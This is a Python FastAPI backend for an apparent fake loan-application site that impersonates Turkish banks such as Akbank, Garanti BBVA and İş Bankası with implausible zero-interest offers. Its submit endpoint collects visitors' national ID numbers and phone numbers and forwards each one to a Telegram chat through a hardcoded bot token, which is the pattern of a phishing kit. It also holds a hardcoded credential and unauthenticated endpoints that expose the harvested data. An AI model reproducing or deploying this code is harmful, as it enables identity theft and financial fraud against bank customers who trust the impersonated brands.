from fastapi import FastAPI, HTTPException
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
from typing import List
import json
import urllib.request
import urllib.parse
import os
from datetime import datetime

app = FastAPI(title="Kredi Başvuru API")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

applications_storage = []
telegram_settings = {
    "bot_token": os.environ.get('TELEGRAM_BOT_TOKEN', '6719470714:AAEiTm7V6s3zTB_etIrOpaykcHzDWp3i7YA'),
    "chat_id": os.environ.get('TELEGRAM_CHAT_ID', '-4915858013')
}

class LoanApplication(BaseModel):
    tc_kimlik: str
    telefon: str
    bank_name: str
    amount: int
    months: int

class TelegramSettings(BaseModel):
    bot_token: str
    chat_id: str

@app.get("/")
async def health_check():
    return {"status": "healthy", "message": "Kredi Başvuru API is running"}

@app.get("/api/banks")
async def get_banks():
    banks = [
        {
            "id": 1,
            "name": "Akbank",
            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/ac807fc1-b3e9-46f6-899d-ce70882e7f57.svg",
            "campaign": "%0 faiz oranlı 3 Ay vadeli 25.000 TL'ye varan taksitli avans",
            "color": "red"
        },
        {
            "id": 2,
            "name": "QNB",
            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/f7fcb8e4-7b8e-4b5a-9c3d-2e1f4a6b8c9d.svg",
            "campaign": "3 Ay vadeli 25.000 TL'ye varan nakit avans",
            "color": "purple"
        },
        {
            "id": 3,
            "name": "TEB",
            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/b2d4c6e8-9a1b-4c5d-8e7f-3a2b5c8d9e0f.svg",
            "campaign": "%0 faiz oranlı 3 Ay vadeli 25.000 TL'ye varan nakit avans",
            "color": "green"
        },
        {
            "id": 4,
            "name": "DenizBank",
            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/e5f7a9b1-2c3d-4e5f-9a8b-6c7d8e9f0a1b.svg",
            "campaign": "3 Ay vadeli 65.000 TL'ye varan kredi",
            "color": "cyan"
        },
        {
            "id": 5,
            "name": "Garanti BBVA",
            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/c8d0e2f4-5a6b-7c8d-0e1f-9a2b3c4d5e6f.svg",
            "campaign": "Bonus kart sahiplerine özel avantajlar",
            "color": "green"
        },
        {
            "id": 6,
            "name": "Türkiye İş Bankası",
            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/a1b2c3d4-e5f6-7a8b-9c0d-1e2f3a4b5c6d.svg",
            "campaign": "Maximum kart avantajı",
            "color": "blue"
        },
        {
            "id": 7,
            "name": "Albaraka",
            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/d7e8f9a0-b1c2-3d4e-5f6a-7b8c9d0e1f2a.svg",
            "campaign": "Katılım bankacılığı avantajı",
            "color": "gray"
        },
        {
            "id": 8,
            "name": "Enpara",
            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/f0a1b2c3-d4e5-6f7a-8b9c-0d1e2f3a4b5c.svg",
            "campaign": "Dijital bankacılık fırsatı",
            "color": "pink"
        },
        {
            "id": 9,
            "name": "ON",
            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/b3c4d5e6-f7a8-9b0c-1d2e-3f4a5b6c7d8e.svg",
            "campaign": "Tamamen dijital deneyim",
            "color": "green"
        },
        {
            "id": 10,
            "name": "Getirfinans",
            "logo": "https://cdn.hesap.com/cdn-cgi/image/height=60,fit=contain,quality=80,format=webp/company/logos/e6f7a8b9-c0d1-2e3f-4a5b-6c7d8e9f0a1b.svg",
            "campaign": "450.000 TL'ye varan kredi",
            "color": "purple"
        }
    ]
    return banks

@app.post("/api/calculate")
async def calculate_loan(request: dict):
    amount = request.get("amount")
    months = request.get("months")
    
    if not amount or not months:
        raise HTTPException(status_code=400, detail="Amount and months are required")
    
    if amount < 25000 or amount > 450000:
        raise HTTPException(status_code=400, detail="Tutar 25.000 - 450.000 TL arasında olmalıdır")
    
    if months < 3 or months > 60:
        raise HTTPException(status_code=400, detail="Vade 3 - 60 ay arasında olmalıdır")
    
    monthly_payment = amount / months
    total_payment = amount
    
    return {
        "amount": amount,
        "months": months,
        "monthly_payment": round(monthly_payment, 2),
        "total_payment": total_payment,
        "interest_rate": 0
    }

@app.post("/api/submit")
async def submit_application(application: LoanApplication):
    global applications_storage
    
    new_application = {
        "id": len(applications_storage) + 1,
        "tc_kimlik": application.tc_kimlik,
        "telefon": application.telefon,
        "bank_name": application.bank_name,
        "amount": application.amount,
        "months": application.months,
        "status": "pending",
        "created_at": datetime.now().isoformat()
    }
    
    applications_storage.append(new_application)
    
    try:
        bot_token = telegram_settings.get("bot_token")
        chat_id = telegram_settings.get("chat_id")
        
        message = f"""🏦 Yeni Kredi Başvurusu

👤 T.C. Kimlik: {application.tc_kimlik}
📞 Telefon: {application.telefon}
🏛️ Banka: {application.bank_name}
💰 Tutar: {application.amount:,} TL
📅 Vade: {application.months} ay
⏰ Tarih: {datetime.now().strftime('%d.%m.%Y %H:%M')}"""

        telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        telegram_data = {
            'chat_id': chat_id,
            'text': message,
            'parse_mode': 'HTML'
        }
        
        req = urllib.request.Request(
            telegram_url,
            data=urllib.parse.urlencode(telegram_data).encode(),
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        urllib.request.urlopen(req)
    except Exception as e:
        print(f"Telegram error: {e}")
    
    return {"success": True, "message": "Başvuru başarıyla gönderildi"}

@app.get("/api/applications")
async def get_applications():
    global applications_storage
    return applications_storage

@app.get("/api/telegram-settings")
async def get_telegram_settings():
    return telegram_settings

@app.post("/api/telegram-settings")
async def update_telegram_settings(settings: TelegramSettings):
    global telegram_settings
    telegram_settings["bot_token"] = settings.bot_token
    telegram_settings["chat_id"] = settings.chat_id
    
    os.environ['TELEGRAM_BOT_TOKEN'] = settings.bot_token
    os.environ['TELEGRAM_CHAT_ID'] = settings.chat_id
    
    return {"success": True, "message": "Telegram ayarları güncellendi"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
